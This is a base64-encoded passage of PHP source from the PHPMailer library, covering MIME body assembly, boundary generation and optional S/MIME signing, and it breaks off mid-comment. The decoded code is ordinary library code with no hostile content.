aWwnKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkxFOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRyZXN1bHQ7CiAgICB9CgogICAgLyoqCiAgICAgKiBSZXR1cm5zIHRoZSB3aG9sZSBNSU1FIG1lc3NhZ2UuCiAgICAgKiBJbmNsdWRlcyBjb21wbGV0ZSBoZWFkZXJzIGFuZCBib2R5LgogICAgICogT25seSB2YWxpZCBwb3N0IHByZVNlbmQoKS4KICAgICAqIEBzZWUgUEhQTWFpbGVyOjpwcmVTZW5kKCkKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0U2VudE1JTUVNZXNzYWdlKCkKICAgIHsKICAgICAgICByZXR1cm4gcnRyaW0oJHRoaXMtPk1JTUVIZWFkZXIgLiAkdGhpcy0+bWFpbEhlYWRlciwgIlxuXHIiKSAuIHNlbGY6OkNSTEYgLiBzZWxmOjpDUkxGIC4gJHRoaXMtPk1JTUVCb2R5OwogICAgfQoKICAgIC8qKgogICAgICogQ3JlYXRlIHVuaXF1ZSBJRAogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdlbmVyYXRlSWQoKSB7CiAgICAgICAgcmV0dXJuIG1kNSh1bmlxaWQodGltZSgpKSk7CiAgICB9CgogICAgLyoqCiAgICAgKiBBc3NlbWJsZSB0aGUgbWVzc2FnZSBib2R5LgogICAgICogUmV0dXJucyBhbiBlbXB0eSBzdHJpbmcgb24gZmFpbHVyZS4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQHJldHVybiBzdHJpbmcgVGhlIGFzc2VtYmxlZCBtZXNzYWdlIGJvZHkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNyZWF0ZUJvZHkoKQogICAgewogICAgICAgICRib2R5ID0gJyc7CiAgICAgICAgLy9DcmVhdGUgdW5pcXVlIElEcyBhbmQgcHJlc2V0IGJvdW5kYXJpZXMKICAgICAgICAkdGhpcy0+dW5pcXVlaWQgPSAkdGhpcy0+Z2VuZXJhdGVJZCgpOwogICAgICAgICR0aGlzLT5ib3VuZGFyeVsxXSA9ICdiMV8nIC4gJHRoaXMtPnVuaXF1ZWlkOwogICAgICAgICR0aGlzLT5ib3VuZGFyeVsyXSA9ICdiMl8nIC4gJHRoaXMtPnVuaXF1ZWlkOwogICAgICAgICR0aGlzLT5ib3VuZGFyeVszXSA9ICdiM18nIC4gJHRoaXMtPnVuaXF1ZWlkOwoKICAgICAgICBpZiAoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpIHsKICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldE1haWxNSU1FKCkgLiAkdGhpcy0+TEU7CiAgICAgICAgfQoKICAgICAgICAkdGhpcy0+c2V0V29yZFdyYXAoKTsKCiAgICAgICAgJGJvZHlFbmNvZGluZyA9ICR0aGlzLT5FbmNvZGluZzsKICAgICAgICAkYm9keUNoYXJTZXQgPSAkdGhpcy0+Q2hhclNldDsKICAgICAgICAvL0NhbiB3ZSBkbyBhIDctYml0IGRvd25ncmFkZT8KICAgICAgICBpZiAoJGJvZHlFbmNvZGluZyA9PSAnOGJpdCcgYW5kICEkdGhpcy0+aGFzOGJpdENoYXJzKCR0aGlzLT5Cb2R5KSkgewogICAgICAgICAgICAkYm9keUVuY29kaW5nID0gJzdiaXQnOwogICAgICAgICAgICAvL0FsbCBJU08gODg1OSwgV2luZG93cyBjb2RlcGFnZSBhbmQgVVRGLTggY2hhcnNldHMgYXJlIGFzY2lpIGNvbXBhdGlibGUgdXAgdG8gNy1iaXQKICAgICAgICAgICAgJGJvZHlDaGFyU2V0ID0gJ3VzLWFzY2lpJzsKICAgICAgICB9CiAgICAgICAgLy9JZiBsaW5lcyBhcmUgdG9vIGxvbmcsIGFuZCB3ZSdyZSBub3QgYWxyZWFkeSB1c2luZyBhbiBlbmNvZGluZyB0aGF0IHdpbGwgc2hvcnRlbiB0aGVtLAogICAgICAgIC8vY2hhbmdlIHRvIHF1b3RlZC1wcmludGFibGUgdHJhbnNmZXIgZW5jb2RpbmcgZm9yIHRoZSBib2R5IHBhcnQgb25seQogICAgICAgIGlmICgnYmFzZTY0JyAhPSAkdGhpcy0+RW5jb2RpbmcgYW5kIHNlbGY6Omhhc0xpbmVMb25nZXJUaGFuTWF4KCR0aGlzLT5Cb2R5KSkgewogICAgICAgICAgICAkYm9keUVuY29kaW5nID0gJ3F1b3RlZC1wcmludGFibGUnOwogICAgICAgIH0KCiAgICAgICAgJGFsdEJvZHlFbmNvZGluZyA9ICR0aGlzLT5FbmNvZGluZzsKICAgICAgICAkYWx0Qm9keUNoYXJTZXQgPSAkdGhpcy0+Q2hhclNldDsKICAgICAgICAvL0NhbiB3ZSBkbyBhIDctYml0IGRvd25ncmFkZT8KICAgICAgICBpZiAoJGFsdEJvZHlFbmNvZGluZyA9PSAnOGJpdCcgYW5kICEkdGhpcy0+aGFzOGJpdENoYXJzKCR0aGlzLT5BbHRCb2R5KSkgewogICAgICAgICAgICAkYWx0Qm9keUVuY29kaW5nID0gJzdiaXQnOwogICAgICAgICAgICAvL0FsbCBJU08gODg1OSwgV2luZG93cyBjb2RlcGFnZSBhbmQgVVRGLTggY2hhcnNldHMgYXJlIGFzY2lpIGNvbXBhdGlibGUgdXAgdG8gNy1iaXQKICAgICAgICAgICAgJGFsdEJvZHlDaGFyU2V0ID0gJ3VzLWFzY2lpJzsKICAgICAgICB9CiAgICAgICAgLy9JZiBsaW5lcyBhcmUgdG9vIGxvbmcsIGFuZCB3ZSdyZSBub3QgYWxyZWFkeSB1c2luZyBhbiBlbmNvZGluZyB0aGF0IHdpbGwgc2hvcnRlbiB0aGVtLAogICAgICAgIC8vY2hhbmdlIHRvIHF1b3RlZC1wcmludGFibGUgdHJhbnNmZXIgZW5jb2RpbmcgZm9yIHRoZSBhbHQgYm9keSBwYXJ0IG9ubHkKICAgICAgICBpZiAoJ2Jhc2U2NCcgIT0gJGFsdEJvZHlFbmNvZGluZyBhbmQgc2VsZjo6aGFzTGluZUxvbmdlclRoYW5NYXgoJHRoaXMtPkFsdEJvZHkpKSB7CiAgICAgICAgICAgICRhbHRCb2R5RW5jb2RpbmcgPSAncXVvdGVkLXByaW50YWJsZSc7CiAgICAgICAgfQogICAgICAgIC8vVXNlIHRoaXMgYXMgYSBwcmVhbWJsZSBpbiBhbGwgbXVsdGlwYXJ0IG1lc3NhZ2UgdHlwZXMKICAgICAgICAkbWltZXByZSA9ICJUaGlzIGlzIGEgbXVsdGktcGFydCBtZXNzYWdlIGluIE1JTUUgZm9ybWF0LiIgLiAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgc3dpdGNoICgkdGhpcy0+bWVzc2FnZV90eXBlKSB7CiAgICAgICAgICAgIGNhc2UgJ2lubGluZSc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRib2R5Q2hhclNldCwgJycsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2F0dGFjaCc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRib2R5Q2hhclNldCwgJycsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdpbmxpbmVfYXR0YWNoJzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvcmVsYXRlZDsnKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGJvZHlDaGFyU2V0LCAnJywgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2lubGluZScsICR0aGlzLT5ib3VuZGFyeVsyXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHQnOgogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYWx0Qm9keUNoYXJTZXQsICd0ZXh0L3BsYWluJywgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5BbHRCb2R5LCAkYWx0Qm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRib2R5Q2hhclNldCwgJ3RleHQvaHRtbCcsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5JY2FsKSkgewogICAgICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICcnLCAndGV4dC9jYWxlbmRhcjsgbWV0aG9kPVJFUVVFU1QnLCAnJyk7CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+SWNhbCwgJHRoaXMtPkVuY29kaW5nKTsKICAgICAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lJzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGFsdEJvZHlDaGFyU2V0LCAndGV4dC9wbGFpbicsICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9yZWxhdGVkOycpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsyXSAuICciJyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYm9keUNoYXJTZXQsICd0ZXh0L2h0bWwnLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnaW5saW5lJywgJHRoaXMtPmJvdW5kYXJ5WzJdKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2FsdF9hdHRhY2gnOgogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9hbHRlcm5hdGl2ZTsnKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGFsdEJvZHlDaGFyU2V0LCAndGV4dC9wbGFpbicsICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYm9keUNoYXJTZXQsICd0ZXh0L2h0bWwnLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuZEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lX2F0dGFjaCc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L2FsdGVybmF0aXZlOycpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsyXSAuICciJyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYWx0Qm9keUNoYXJTZXQsICd0ZXh0L3BsYWluJywgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5BbHRCb2R5LCAkYWx0Qm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzJdKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L3JlbGF0ZWQ7Jyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzNdIC4gJyInKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbM10sICRib2R5Q2hhclNldCwgJ3RleHQvaHRtbCcsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbM10pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuZEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgLy8gQ2F0Y2ggY2FzZSAncGxhaW4nIGFuZCBjYXNlICcnLCBhcHBsaWVzIHRvIHNpbXBsZSBgdGV4dC9wbGFpbmAgYW5kIGB0ZXh0L2h0bWxgIGJvZHkgY29udGVudCB0eXBlcwogICAgICAgICAgICAgICAgLy9SZXNldCB0aGUgYEVuY29kaW5nYCBwcm9wZXJ0eSBpbiBjYXNlIHdlIGNoYW5nZWQgaXQgZm9yIGxpbmUgbGVuZ3RoIHJlYXNvbnMKICAgICAgICAgICAgICAgICR0aGlzLT5FbmNvZGluZyA9ICRib2R5RW5jb2Rpbmc7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkdGhpcy0+RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQoKICAgICAgICBpZiAoJHRoaXMtPmlzRXJyb3IoKSkgewogICAgICAgICAgICAkYm9keSA9ICcnOwogICAgICAgIH0gZWxzZWlmICgkdGhpcy0+c2lnbl9rZXlfZmlsZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKCFkZWZpbmVkKCdQS0NTN19URVhUJykpIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleHRlbnNpb25fbWlzc2luZycpIC4gJ29wZW5zc2wnKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8vIEBUT0RPIHdvdWxkIGJlIG5pY2UgdG8gdXNlIHBocDovL3RlbXAgc3RyZWFtcyBoZXJlLCBidXQgbmVlZCB0byB3cmFwIGZvciBQSFAgPCA1LjEKICAgICAgICAgICAgICAgICRmaWxlID0gdGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksICdtYWlsJyk7CiAgICAgICAgICAgICAgICBpZiAoZmFsc2UgPT09IGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCAkYm9keSkpIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdzaWduaW5nJykgLiAnIENvdWxkIG5vdCB3cml0ZSB0ZW1wIGZpbGUnKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRzaWduZWQgPSB0ZW1wbmFtKHN5c19nZXRfdGVtcF9kaXIoKSwgJ3NpZ25lZCcpOwogICAgICAgICAgICAgICAgLy9Xb3JrYXJvdW5kIGZvciBQSFAgYnVnIGh0dHBzOi8vYnVncy5waHAubmV0L2J1Zy5waHA/aWQ9NjkxOTcKICAgICAgICAgICAgICAgIGlmIChlbXB0eSgkdGhpcy0+c2lnbl9leHRyYWNlcnRzX2ZpbGUpKSB7CiAgICAgICAgICAgICAgICAgICAgJHNpZ24gPSBAb3BlbnNzbF9wa2NzN19zaWduKAogICAgICAgICAgICAgICAgICAgICAgICAkZmlsZSwKICAgICAgICAgICAgICAgICAgICAgICAgJHNpZ25lZCwKICAgICAgICAgICAgICAgICAgICAgICAgJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fY2VydF9maWxlKSwKICAgICAgICAgICAgICAgICAgICAgICAgYXJyYXkoJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpLCAkdGhpcy0+c2lnbl9rZXlfcGFzcyksCiAgICAgICAgICAgICAgICAgICAgICAgIG51bGwKICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkc2lnbiA9IEBvcGVuc3NsX3BrY3M3X3NpZ24oCiAgICAgICAgICAgICAgICAgICAgICAgICRmaWxlLAogICAgICAgICAgICAgICAgICAgICAgICAkc2lnbmVkLAogICAgICAgICAgICAgICAgICAgICAgICAnZmlsZTovLycgLiByZWFscGF0aCgkdGhpcy0+c2lnbl9jZXJ0X2ZpbGUpLAogICAgICAgICAgICAgICAgICAgICAgICBhcnJheSgnZmlsZTovLycgLiByZWFscGF0aCgkdGhpcy0+c2lnbl9rZXlfZmlsZSksICR0aGlzLT5zaWduX2tleV9wYXNzKSwKICAgICAgICAgICAgICAgICAgICAgICAgbnVsbCwKICAgICAgICAgICAgICAgICAgICAgICAgUEtDUzdfREVUQUNIRUQsCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5zaWduX2V4dHJhY2VydHNfZmlsZQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJHNpZ24pIHsKICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCRmaWxlKTsKICAgICAgICAgICAgICAgICAgICAkYm9keSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRzaWduZWQpOwogICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJHNpZ25lZCk7CiAgICAgICAgICAgICAgICAgICAgLy9UaGUgbWVzc2FnZSByZXR1cm5lZCBieSBvcGVuc3NsIGNvbnRhaW5zIGJvdGggaGVhZGVycyBhbmQgYm9keSwgc28gbmVlZCB0byBzcGxpdCB0aGVtIHVwCiAgICAgICAgICAgICAgICAgICAgJHBhcnRzID0gZXhwbG9kZSgiXG5cbiIsICRib2R5LCAyKTsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciAuPSAkcGFydHNbMF0gLiAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgPSAkcGFydHNbMV07CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJGZpbGUpOwogICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJHNpZ25lZCk7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnc2lnbmluZycpIC4gb3BlbnNzbF9lcnJvcl9zdHJpbmcoKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICAgICAkYm9keSA9ICcnOwogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJGJvZHk7CiAgICB9CgogICAgLyoqCiAgICAgKiBSZXR1cm4gdGhlIHN0YXJ0IG9mIGEgbWVzc2FnZSBib3VuZGFyeS4KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib3VuZGFyeQogICAgICogQHBhcmFtIHN0cmluZyAkY2hhclNldAogICAgICogQHBhcmFtIHN0cmluZyAkY29udGVudFR5cGUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0Qm91bmRhcnkoJGJvdW5kYXJ5LCAkY2hhclNldCwgJGNvbnRlbnRUeXBlLCAkZW5jb2RpbmcpCiAgICB7CiAgICAgICAgJHJlc3VsdCA9ICcnOwogICAgICAgIGlmICgkY2hhclNldCA9PSAnJykgewogICAgICAgICAgICAkY2hhclNldCA9ICR0aGlzLT5DaGFyU2V0OwogICAgICAgIH0KICAgICAgICBpZiAoJGNvbnRlbnRUeXBlID09ICcnKSB7CiAgICAgICAgICAgICRjb250ZW50VHlwZSA9ICR0aGlzLT5Db250ZW50VHlwZTsKICAgICAgICB9CiAgICAgICAgaWYgKCRlbmNvZGluZyA9PSAnJykgewogICAgICAgICAgICAkZW5jb2RpbmcgPSAkdGhpcy0+RW5jb2Rpbmc7CiAgICAgICAgfQogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkYm91bmRhcnkpOwogICAgICAgICRyZXN1bHQgLj0gc3ByaW50ZignQ29udGVudC1UeXBlOiAlczsgY2hhcnNldD0lcycsICRjb250ZW50VHlwZSwgJGNoYXJTZXQpOwogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkxFOwogICAgICAgIC8vIFJG